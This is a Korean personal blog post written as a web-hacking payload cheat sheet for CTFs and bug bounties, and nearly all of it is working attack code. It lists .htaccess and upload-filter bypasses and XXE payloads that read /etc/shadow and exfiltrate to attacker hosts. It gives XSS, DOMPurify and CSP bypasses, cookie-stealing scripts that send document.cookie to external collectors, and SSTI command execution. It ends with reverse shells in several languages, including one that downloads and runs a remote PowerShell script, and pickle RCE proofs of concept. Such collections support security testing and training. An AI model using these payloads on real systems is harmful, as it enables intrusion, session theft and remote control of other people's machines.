---
layout: post
date: 2021-01-15 00:00:00
title: "Web Note (Update 2021.02.27)"
categories: Note
tags: [CheatSheet]
author:
  - Jeongwon Jo
---
<strong>워게임, CTF 및 버그바운티를 하다 보면 생각 외로 필요한 것들이 많습니다. 하지만 그 많은 것들을 항상 기억하고 있기는 힘들다는 것을 알고 있기 때문에 앞으로 하나 하나 중요한 페이로드들을 정리를 해나갈 것 이고, 이번 글의 가독성은 저의 기준으로 작성하겠습니다.</strong>

---
## .htaccess<br>

```
php_flag engine off
```
```
AddType application/x-httpd-php .pocas
```
```
php_flag zend.multibyte 1
php_value zend.script_encoding "UTF-7"
php_value auto_append_file .htaccess
#+ADw?php phpinfo()+ADs
```
```
#define test_width 1337
#define test_height 1337
AddType application/x-httpd-php .pocas
php_flag zend.multibyte 1
php_value zend.script_encoding "UTF-7"
```
```
#define width 1337
#define height 1337

AddType application/x-httpd-php .pocas
php_value zend.multibyte 1
php_value zend.detect_unicode 1
php_value display_errors 1
```

---
## Upload Function<br>
<span style="color:#21C587">&#35;</span><strong> Blacklisting Bypass</strong><br>
- PHP → `.php`, `.phtm`, `phtml`, `.phps`, `.pht`, `.php2`, `.php3`, `.php4`, `.php5`, `.shtml`, `.pahr`, `.pgif`, `.inc`<br>
- ASP → `.asp`, `.aspx`, `.cer`, `.asa`<br>
- JSP → `.jsp`, `.jspx`, `.jsw`, `.jsv`, `jspf`<br>

<span style="color:#21C587">&#35;</span><strong> Whitelisting Bypass</strong><br>
- file.jpg.php
- file.php.jpg
- file.php.blah123jpg
- file.php%00.jpt
- file.php\x00.jpt
- file.php%00
- file.php%20
- file.php%0d%0a.jpg
- file.php/
- file.php.\

---
## XXE (Original)<br>
<span style="color:#21C587">&#35;</span><strong> XXE Original</strong><br>
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE burp [<!ENTITY burp SYSTEM "file:///etc/shadow"> ]>
<lfi>&burp;</lfi>
```

<span style="color:#21C587">&#35;</span><strong> XXE to SSRF</strong><br>
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE burp [<!ENTITY burp system "domain"> ]>
<ssrf>&burp;</ssrf>
```

<span style="color:#21C587">&#35;</span><strong> XXE (XInclude attacks)</strong><br>
```xml
<burp xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></burp>
```

<span style="color:#21C587">&#35;</span><strong> XXE (php wrapper)</strong><br>
```xml
<?xml version="1.0"?>
<!DOCTYPE burp [
<!ENTITY burp SYSTEM "php://filter/read=convert.base64-encode/resource=****">]>
<lfi>&burp;</lfi>
```

<span style="color:#21C587">&#35;</span><strong> OOB XXE</strong><br>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % xxe SYSTEM "http://ip/poc.dtd">
%xxe;
]>
```
```xml
// http://ip/poc.dtd
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?collect=%file;'>">
%all;
```

---
## XXE (feat svg)<br>
<span style="color:#21C587">&#35;</span><strong> XXE</strong><br>
```xml
<?xml version="1.0" standalone="yes" ?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/issue" > ]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="40" x="0" y="15">&xxe;</text>
</svg>                    
```

<span style="color:#21C587">&#35;</span><strong> Blind XXE & SSRF</strong><br>
```xml
<?xml version="1.0" encoding="UTF-8" standalone="no”?>
<!DOCTYPE ENTY [ <!ENTITY XXE SYSTEM "file:///etc/issue”> ]>
<svg xmlns:svg=”http://www.w3.org/2000/svg" xmlns=”http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height=”200">
<image xlink:href="http://EVILHOST:1337/SSRF?&XXE;" />
</svg>
```

<span style="color:#21C587">&#35;</span><strong> XXE & XSS</strong><br>
```xml
<?xml version="1.1" standlone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <rect style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
  <script type="text/javascript">
    alert("XXE & XSS");
  </script>
</svg>
```

<span style="color:#21C587">&#35;</span><strong> XXE & Open Redirect</strong><br>
```xml
<code>
  <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
  <svg onload="window.location='URL'" xmlns="http://www.w3.rog/200/svg">
    <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
  </svg>
</code>
```

---
## XSS Payload<br>
<span style="color:#21C587">&#35;</span><strong> Reflection XSS statement</strong><br>

```html
script tag
<scrit>void''??globalThis?.alert?.(...[0b1_0_1_0_0_1_1_1_0_0_1,],)</script>
<script>alert(1)</scipt>
<script>onerror=alert;throw 1</script>
<script>{onerror=alert}throw 1</script>
<script src="data:;base64,YWxlcnQoMSk="></script>
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js></script><div/ng-app><input/autofocus/ng-focus=$event.path|orderBy:'[].constructor.from([1],alert)'></div>

img tag
<img src=x onerror=window.alert(1) >
<img src=x onerror=window['eva'+'l'](alert(1)) >
<img src=x onerror=_=alert,_(/xss/) >
<img src=x onerror=_='e'+'val',_(alert(1)) >

svg tag
<svg onload=&#97&#108&#101&#114&#116&#40&#49&#41>
<svg/onload=setTimeout('\141\154\145\162\164\50\61\51')>
<svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
  
details tag
<details open ontoggle=top.alert(1)>
<details open ontoggle=top['prompt'](1)>
<details open ontoggle=eval('alert(1)') >
<details open ontoggle=eval(atob('YWxlcnQoMSk=')) >
<details open ontoggle=eval('\141\154\145\162\164\50\61\51') >
<details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,49,41)) >
  
iframe tag
<iframe onload=alert(1)>
<iframe onload=&#97&#108&#101&#114&#116&#40&#49&#41>
<iframe srcdoc="<img src=x:x onerror=alert(1)>" />
<iframe onload=location='javascri'.concat('pt:aler','t(1)')>
<iframe onload=location=['java','script:','alert(1)'].join("")>
<iframe src="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+"></iframe>

body tag
<body onpageshow=alert(1)>
<body/onfocus=alert(1)>
<body/onload=alert(1)>
<body/onload=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62)) >
  
  
input tag
<input autofocus onfocus=alert(1)>
<input type=image src onerror=alert(1)>
<input onblur=alert(1) id=x><input autofocus>
<input onbeforecopy=alert(1) value="XSS" autofocus>
<input/autofocus/onfocus=&#97&#108&#101&#114&#116&#40&#49&#41>
  
a tag
<a onmouseover="alert(1)">link</a>
<a href=# name=xss autofocus onfocus=alert(1)>
<a draggable="true" ondragend="alert(1)">test</a>
<a href="javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76'">link</a>
  
video tag
<video onkeypress="alert(1)" contenteditable></video>
<video src=1 onerror=alert(/xss/)>
<video src onloadstart=alert(1)>

button tag
<button onfocus=alert(1) autofocus>
<button ondblclick="alert(1)" autofocus tabindex=1>test</button>
<button onkeyup="alert(1)" contenteditable>test</button>
  
object tag
<object data='data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+'></object>
<object type='text/x-scriptlet' data='http://example.com/xss.html'></object>
  xss.html -> <script>alert(1)</script>
 
embed tag
<embed src="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+"></embed>
<embed src="javascript:alert(1)">
  
audio tag
<audio src=x onerror=alert(/xss/)>
  
textarea tag
<textarea autofocus onfocus=alert(1)>
  
meter tag
<meter onmouseover=alert(1)></meter>
<meter onmousemove="alert(1)"></meter>

select tag
<select autofocus onfocus=alert(1)>

form tag
<form onsubmit=alert(1)><button type=submit></button></form>
  
Constructor
{{+constructor.constructor("alert(document.cookie)")()+}}
```

<span style="color:#21C587">&#35;</span><strong> Cookie Stealth</strong><br>
```html
<script>fetch('url'%2bdocument.cookie)</script>
<script>(new Image).src='url'%2bdocument.cookie;</script>
<script src="//code.jquery.com/jquery.min.js"></script><script>$.get('url'%2bdocument.cookie)</script>
<script src="//code.jquery.com/jquery.min.js"></script><script>$.getScript("//domain"%2bdocument.cookie)</script>
<video src=1 onerror="javascript:document.location='url'%2bdocument.cookie">
<iframe onload=location='javascri'.concat("pt:document",".location=","'url'%2bdocument.cookie")>
<iframe onload=location=["java","script:","document.location=","'url'%2bdocument.cookie"].join("")>
<svg/onload=setTimeout("\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u003d\u0027\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0031\u0034\u0031\u002e\u0031\u0036\u0034\u002e\u0035\u0032\u002e\u0032\u0030\u0037\u003a\u0031\u0032\u0033\u0034\u0035\u002f\u003f\u0061\u003d\u0027\u002b\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u0063\u006f\u006f\u006b\u0069\u0065")>
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js></script><div/ng-app><input/autofocus/ng-focus=$event.path|orderBy:'[].constructor.from([location.replace("//384bbb03a643480f7077ff3d9d4b01d5.m.pipedream.net?"+document.cookie)],console.log)'></div>
```

---
## DOMPurify Bypass<br>
```html
<form><math><mtext><form><mglyph><style></math><img src onerror=alert(1)></style></mglyph></form></mtext></math></form>
<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">
<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">
<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">
<math><mtext><table><mglyph><style><![CDATA[</style><img title="]]&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">
<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">
```

---
## <span style="color:#21C587"></span> Iframe Sandbox Bypass<br>
  
```html
<!doctype html>
<html>
  <head>
    <title>iframe sandbox bypass</title>
    <script>
        async function exploit() {
            const cmd="xss payoad"
            
            await new Promise((r) => { window.addEventListener(('load'), r); });
            document.querySelector('iframe')
              .contentWindow
              .postMessage(cmd, '*');  // IDE -> sandbox message
        };
    </script>
  </head>
  <body>
      <img src='x' onerror="exploit()" />
      <iframe name='pocas' src="https://domain/sandbox.html" frameborder="0"></iframe>
  </body>
</html>
```

---
## CSP Bypass<br>
<span style="color:#21C587">&#35;</span><strong> Use an accepted domain</strong><br>
```
Content-Security-Policy: script-src 'self' http://141.164.52.207
```
<strong>위와 같이 나 자신과 특정(http://141.164.52.207) 도메인에서 오는 스크립트는 실행이 가능한 경우, 해당 서버에 파일(xss poc)을 업로드하고, poc 코드를 불러오면 위와 같은 CSP를 우회할 수 있습니다.</strong><br><br>

<span style="color:#21C587">&#35;</span><strong> Header Injection</strong><br>

<strong>만약 헤더 인젝션이 가능하다고 가정하에 응답 코드를 102와 같은 것들로 수정하면 브라우저는 CSP를 해석하지 않아 우회가 가능합니다.</strong><br><br>

<span style="color:#21C587">&#35;</span><strong> AngularJS xss</strong><br>
```
Content-Security-Policy: default-src 'self' script-src 'self' cdnjs.cloudflare.com;
```

```html
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js></script><div/ng-app><input/autofocus/ng-focus=$event.path|orderBy:'[].constructor.from([1],alert)'></div>

<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js></script><div/ng-app><input/autofocus/ng-focus=$event.path|orderBy:'[].constructor.from([location.replace("url"+document.cookie)],console.log)'></div>
```
<strong>만약 위와 같이 `cdnjs.cloudflare.com`와 같이 AngularJS를 가져와서 사용할 수 있을 경우 AngularJS XSS를 이용하면 CSP를 우회할 수 있고, 예시 페이로드는 위와 같습니다.</strong><br>

<span style="color:#21C587">&#35;</span><strong> CSP Option ↔ Bypass</strong><br>
```html
Content-Security-Policy: 
default-src 'self' data: *; connect-src 'self'; script-src  'self' ;
report-uri /_csp; upgrade-insecure-requests

<iframe srcdoc='<script src="data:text/javascript,alert(1)"></script>'></iframe>
```
```html
Content-Security-Policy: script-src https://google.com 'unsafe-eval' data: http://*; 
child-src 'none'; 
report-uri /Report-parsing-url;

<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```

---
## <span style="color:#21C587"></span> Javascript Payload<br>

```javascript
fetch('https://pocas.kr', {
  method: 'POST',
  headers: {'headerName':'headerValue'}
}).then(x=>x.text()).then(x=>fetch("https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/f="+x));
```
```javascript
fetch('https://pocas.kr', {
  method: 'POST',
  headers: {'headerName':'headerValue'}
}).then(function(x){return x.text();}).then(function(xx){fetch("https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/f="+xx)});
```
```javascript
x = new XMLHttpRequest();
x.open("GET", "https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/f=" + document.cookie, true);
x.send();
```

```javascript
require(`fs`).readdirSync(`./`)
```

```javascript
require(`child_process`).execSync(`\x63at\x20<FILE>`).toString()
```

```javascript
// 아래 코드는 파일의 이름이 'T'로 시작하는 파일을 모두 읽는 코드이다. 만약 읽으려는 파일의 이름이 'F'로 시작한다면 'F\x2a'를 주면된다.
require(`child_process`).execSync(`\x63at\x20T\x2a`).toString()
```

---
## <span style="color:#21C587"></span> SSTI<br>

```python
{{7*7}}
{{config}}
{{config.items()}}
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```
```python
{{request|attr(request.args.param)}}&param=__class__
{{request[request.args.param]}}&param=__class__
{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr(["__","class","__"]|join)}}
{{request|attr("__class__")}}
{{request.__class__}}
{{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()}}
{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f’)|attr(‘\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(287)('ls',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('decode')('utf-8')}}
```

---
## <span style="color:#21C587"></span> Path Traversal<br>

<span style="color:#21C587">&#35;</span><strong> Ubuntu</strong><br>
```
/etc/passwd
/etc/issue
/etc/shadow
/etc/group
/etc/hosts
/etc/motd
/proc/self/exe
/proc/net/arp
/proc/net/route
```

<span style="color:#21C587">&#35;</span><strong> Node</strong><br>
```
package.json
```

---
## Reverse Shell<br>
<span style="color:#21C587">&#35;</span><strong> Bash</strong><br>
```
bash -i >& /dev/tcp/domain/port 0>&1
bash -c 'bash -i >& /dev/tcp/domain/port 0>&1'
0<&196;exec 196<>/dev/tcp/domain/port; sh <&196 >&196 2>&196
```

<span style="color:#21C587">&#35;</span><strong> PHP</strong><br>
```php
php -r '$sock=fsockopen("domain",port);exec("/bin/sh -i <&3 >&3 2>&3");'
```

<span style="color:#21C587">&#35;</span><strong> Python</strong><br>
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("kaibro.tw",5566));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

<span style="color:#21C587">&#35;</span><strong> Node.js</strong><br>
```javascript
var net = require("net"), sh = require("child_process").exec("/bin/bash"); var client = new net.Socket(); client.connect(port, "domain", function(){client.pipe(sh.stdin);sh.stdout.pipe(client); sh.stderr.pipe(client);});

require('child_process').exec("bash -c 'bash -i >& /dev/tcp/domain/port 0>&1'");
```

<span style="color:#21C587">&#35;</span><strong> Ruby</strong><br>
```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("domain","port");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

<span style="color:#21C587">&#35;</span><strong> Powershell</strong><br>
```
powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c domain -p port -e cmd
```

---
## Python Pickle RCE PoC<br>

<span style="color:#21C587">&#35;</span><strong> eval</strong><br>
```python
import __builtins__
import pickle
import base64

class rce(object):
  def __reduce__(self):
    x = "open('bash -i >& /dev/tcp/domain/port 0>&1').read()"
    return (__builtins__.eval, (x,))

print(base64.b64encode(pickle.dumps(rce())))
```

<span style="color:#21C587">&#35;</span><strong> os.system</strong><br>
```python
import os
import pickle
import base64

class rce(object):
  def __reduce__(self):
    return (os.system, ('bash -i >& /dev/tcp/domain/port 0>&1',))

print(base64.b64encode(pickle.dumps(rce())))
```

---
*Reference* : [https://www.anquanke.com](https://www.anquanke.com/post/id/176185)<br>
*Reference* : [https://owasp.org/www-community/xss-filter-evasion-cheatsheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)<br>
*Reference* : [https://bittherapy.net/post/~/](https://bittherapy.net/post/a-trick-to-bypass-an-xss-filter-and-execute-javascript/)<br>
*Reference* : [https://medium.com/@schopath/~](https://medium.com/@schopath/bug-bounty-berburu-server-side-request-forgery-ssrf-yuk-2-image-svg-61ecf3ca1951)<br>
*Reference* : [https://twitter.com/HolyBugx](https://twitter.com/HolyBugx/status/1348928810620743682)<br>
*Reference* : [https://github.com/w181496/Web-CTF-Cheatsheet](https://github.com/w181496/Web-CTF-Cheatsheet)<br>
*Reference* : [https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd](https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd)<br>
*Reference* : [https://hackerone.com/reports/1024734](https://hackerone.com/reports/1024734)<br>
*Reference* : [https://medium.com/@nyomanpradipta120/~](https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f)<br>
*Reference* : [https://portswigger.net/research/~](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss)
---

